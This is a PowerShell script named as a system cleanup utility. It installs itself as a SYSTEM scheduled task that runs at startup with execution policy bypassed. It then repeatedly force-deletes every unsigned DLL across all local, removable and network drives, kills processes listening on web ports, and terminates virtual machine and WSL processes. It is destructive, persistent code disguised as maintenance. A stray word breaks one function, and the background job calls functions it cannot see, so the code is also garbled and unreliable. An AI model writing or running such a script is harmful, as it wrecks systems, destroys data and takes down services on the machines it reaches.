function Remove-SuspiciousDLLs {
    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { 
        $_.DriveType -in @('Fixed', 'Removable', 'Network') 
    }
    $dlls = Get-ChildItem -Recurse -Path $drives.Root -Filter "*.dll" -ErrorAction SilentlyContinue
    foreach ($dll in $dlls) {
        $cert = Get-AuthenticodeSignature $dll.FullName
        if ($cert.Status -ne "Valid") {
            $processes = Get-WmiObject Win32_Process | Where-Object { 
                $_.CommandLine -like "*$($dll.FullName)*" 
            }
            foreach ($process in $processes) {
                Stop-Process -Id $process.ProcessId -Force
            }
            takeown /f $dll.FullName /A
            Remove-Item $dll.FullName -Force -ErrorAction SilentlyContinue
        }
    }
}

function Kill-ProcessesOnPorts {
    $ports = @(80, 443, 8009, 8080, 8888)
    $connections = Get-NetTCPConnection -State Listen | Where-Object { $_.LocalPort -in $ports }
    foreach ($conn in $connections) {
        $pid = $conn.OwningProcess
        Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
    }
}

function Stop-AllVMs {
    $vmProcesses = @(
        "vmware-vmx", "vmware", "vmware-tray", "vmwp", "vmnat", "vmnetdhcp", "vmware-authd", 
        "vmware-usbarbitrator", "vmms", "vmcompute", "vmsrvc", "vmwp", "hvhost", "vmmem", 
        "VBoxSVC", "VBoxHeadless", "VirtualBoxVM", "VBoxManage", "qemu-system-x86_64", 
        "qemu-system-i386", "qemu-system-arm", "qemu-system-aarch64", "kvm", "qemu-kvm", 
        "prl_client_app", "prl_cc", "prl_tools_service", "prl_vm_app", "bhyve", "xen", 
        "xenservice", "bochs", "dosbox", "utm", "wsl", "wslhost", "vmmem", "simics", 
        "vbox", "parallels"
    )
    $processes = Get-Process -ErrorAction SilentlyContinue
    $vmRunning = $processes | Where-Object { $vmProcesses -contains $_.Name }
    if ($vmRunning) {
        $vmRunning | Format-Table -Property Id, Name, Description -AutoSize
account
        foreach ($process in $vmRunning) {
            Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        }
    }
}

# Create destination folder and copy script
$destPath = "$env:windir\Setup\Scripts\Bin"
$scriptPath = "$destPath\SystemCleanup.ps1"
$currentScript = $MyInvocation.MyCommand.Path

try {
    # Create directory if it doesn't exist
    if (-not (Test-Path $destPath)) {
        New-Item -ItemType Directory -Path $destPath -Force | Out-Null
    }
    
    # Copy this script to destination
    Copy-Item -Path $currentScript -Destination $scriptPath -Force
    
    # Create scheduled task
    $taskName = "SystemCleanupTask"
    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $scriptPath"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    # Register the task (overwrite if exists)
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
}
catch {
    Write-Error "Failed to set up script persistence: $_"
}

# Start background job
Start-Job -ScriptBlock {
    while ($true) {
        Stop-AllVMs
        Remove-SuspiciousDLLs
        Kill-ProcessesOnPorts
        Start-Sleep -Seconds 60  # Add delay to prevent excessive CPU usage
    }
} | Out-Null